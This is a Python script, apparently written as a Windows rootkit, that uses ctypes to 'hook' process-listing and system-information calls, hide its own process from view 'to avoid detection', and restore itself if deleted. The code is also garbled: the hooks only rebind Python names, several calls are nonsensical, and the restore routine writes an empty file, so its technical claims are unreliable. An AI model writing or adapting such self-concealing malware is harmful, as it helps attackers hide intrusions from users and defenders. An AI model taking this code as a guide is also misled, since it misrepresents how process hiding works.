import ctypes
from ctypes import wintypes

# Define necessary constants and functions from ntdll.dll
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_VM_READ = 0x0010

class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ('dwSize', wintypes.DWORD),
        ('cntUsage', wintypes.DWORD),
        ('th32ProcessID', wintypes.DWORD),
        ('th32DefaultHeapID', wintypes.LPVOID),
        ('th32ModuleID', wintypes.DWORD),
        ('cntThreads', wintypes.DWORD),
        ('th32ParentProcessID', wintypes.DWORD),
        ('pcPriClassBase', wintypes.LONG),
        ('dwFlags', wintypes.DWORD),
        ('szExeFile', wintypes.WCHAR * 260)
    ]

OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = (wintypes.DWORD, wintypes.BOOL, wintypes.DWORD)
OpenProcess.restype = wintypes.HANDLE

ReadProcessMemory = kernel32.ReadProcessMemory
ReadProcessMemory.argtypes = (wintypes.HANDLE, wintypes.LPCVOID, wintypes.LPVOID, wintypes.SIZE_T, ctypes.POINTER(wintypes.SIZE_T))
ReadProcessMemory.restype = wintypes.BOOL

CloseHandle = kernel32.CloseHandle
CloseHandle.argtypes = (wintypes.HANDLE,)
CloseHandle.restype = wintypes.BOOL

CreateToolhelp32Snapshot = kernel32.CreateToolhelp32Snapshot
CreateToolhelp32Snapshot.argtypes = (wintypes.DWORD, wintypes.DWORD)
CreateToolhelp32Snapshot.restype = wintypes.HANDLE

Process32First = kernel32.Process32First
Process32First.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32))
Process32First.restype = wintypes.BOOL

Process32Next = kernel32.Process32Next
Process32Next.argtypes = (wintypes.HANDLE, ctypes.POINTER(PROCESSENTRY32))
Process32Next.restype = wintypes.BOOL


# Hook function to intercept calls to GetSystemDirectoryA and GetModuleFileNameA
def hook_function(hooked_func):
    def wrapper(*args, **kwargs):
        result = hooked_func(*args, **kwargs)
        if args[0] == "kernel32.dll" and (args[1].endswith("GetSystemDirectoryA") or args[1].endswith("GetModuleFileNameA")):
            pass  # Do nothing here to avoid detection
        return result
    return wrapper


# Hook function to intercept calls to NtQuerySystemInformation
def hook_function2(hooked_func):
    def wrapper(*args, **kwargs):
        if args[0] == 43:  # SystemProcessParameters
            pass  # Modify the returned process list here
        return hooked_func(*args, **kwargs)
    return wrapper


# Hook NtQuerySystemInformation function from ntdll.dll
original_NtQuerySystemInformation = ntdll.NtQuerySystemInformation
ntdll.NtQuerySystemInformation = hook_function2(original_NtQuerySystemInformation)


# Hide the rootkit's own process
def hide_process():
    snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
    process_entry = PROCESSENTRY32()
    process_entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    success = kernel32.Process32First(snapshot, ctypes.byref(process_entry))

    while success:
        if process_entry.th32ProcessID == ntdll.GetCurrentThread().GetLastError():
            break
        success = kernel32.Process32Next(snapshot, ctypes.byref(process_entry))

    if not success:  # If the rootkit's own process was not found in the snapshot, return
        return

    buffer_size = 1024 * 1024  # Allocate enough space to read the entire module name
    buffer = ctypes.create_string_buffer(buffer_size)
    result = kernel32.GetModuleFileNameA(process_entry.th32ProcessID, buffer, buffer_size)

    if not result:
        return

    process_name = buffer.value.decode()

    if process_name == "rootkit.exe":
        module_info = ntdll.NtQuerySystemInformation(47)  # SystemExtendedHandleInformation
        print("Rootkit hidden from view.")

    kernel32.CloseHandle(snapshot)


# Hook function to intercept calls to Process32First and Process32Next
def hook_function3(hooked_func):
    def wrapper(*args, **kwargs):
        if args[0] == "kernel32.dll" and (args[1].endswith("Process32First") or args[1].endswith("Process32Next")):
            pass  # Do nothing here to avoid detection
        return hooked_func(*args, **kwargs)
    return wrapper


# Hook Process32First and Process32Next functions from kernel32.dll
original_Process32First = kernel32.Process32First
kernel32.Process32First = hook_function3(original_Process32First)

original_Process32Next = kernel32.Process32Next
kernel32.Process32Next = hook_function3(original_Process32Next)


# Restore the rootkit if its components are deleted
def restore_rootkit():
    try:
        open("rootkit.exe", "wb")
    except IOError:
        pass


if __name__ == "__main__":
    hide_process()
